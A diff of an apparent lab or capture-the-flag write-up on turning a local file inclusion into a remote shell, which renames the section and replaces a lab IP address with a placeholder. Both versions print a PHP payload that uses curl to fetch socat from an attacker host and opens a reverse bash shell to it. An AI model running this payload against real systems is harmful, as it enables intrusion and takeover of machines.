@@ -1,4 +1,4 @@
-# Gaining remote shell
+# Gaining remote shell with LFI2RCE
 
 I explored methods to gain a remote shell on the machine. The following methods can be used (with the `VRFY` or `RCPT TO:` command with SMTP explored before) to run remote commands to establish the shell.&#x20;
 
@@ -86,7 +86,7 @@ Next, we can send the payload to the target:
 
 {% code overflow="wrap" %}
 ```php
-<?php system('curl http://10.4.10.179:8000/socat --output /tmp/socat && chmod +x /tmp/socat &&  /tmp/socat TCP:10.4.10.179:8002 EXEC:"bash -li",pty,stderr,sigint,setsid,sane'); ?>
+<?php system('curl http://<host>:8000/socat --output /tmp/socat && chmod +x /tmp/socat &&  /tmp/socat TCP:<host>:8002 EXEC:"bash -li",pty,stderr,sigint,setsid,sane'); ?>
 ```
 {% endcode %}
 
